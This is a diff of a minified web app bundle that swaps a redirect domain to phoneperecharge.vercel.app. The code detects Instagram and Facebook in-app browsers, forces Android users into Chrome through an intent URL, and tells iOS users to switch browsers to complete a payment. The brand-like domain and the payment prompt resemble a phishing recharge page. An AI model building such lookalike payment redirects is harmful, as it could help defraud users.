@@ -9229,7 +9229,7 @@
                     alt: "",
                     className: "h-20 mx-auto mb-4"
                 }), (0, We.jsx)("a", {
-                    href: "intent://recharge-psi.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;",
+                    href: "intent://phoneperecharge.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;",
                     className: "py-2 px-4 bg-blue-500 rounded-lg text-white font-semibold mt-2",
                     children: "Open In Chrome"
                 })]
@@ -9241,7 +9241,7 @@
                 ! function() {
                     var e = navigator.userAgent || navigator.vendor || window.opera;
                     return e.indexOf("Instagram") > -1 || e.indexOf("FBAN") > -1 || e.indexOf("FBAV") > -1
-                }() ? t(!0): (t(!1), /android/i.test(navigator.userAgent) ? window.location.href = "intent://recharge-psi.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;" : /iPhone|iPad|iPod/i.test(navigator.userAgent) ? ("To complete your payment, please open this link in Safari or Chrome.") : window.location.href = "https://recharge-psi.vercel.app/")
+                }() ? t(!0): (t(!1), /android/i.test(navigator.userAgent) ? window.location.href = "intent://phoneperecharge.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;" : /iPhone|iPad|iPod/i.test(navigator.userAgent) ? ("To complete your payment, please open this link in Safari or Chrome.") : window.location.href = "https://phoneperecharge.vercel.app/")
             }), []), (0, We.jsxs)(We.Fragment, {
                 children: [e && (0, We.jsx)(qe, {}), (0, We.jsxs)(ve, {
                     children: [(0, We.jsx)(he, {
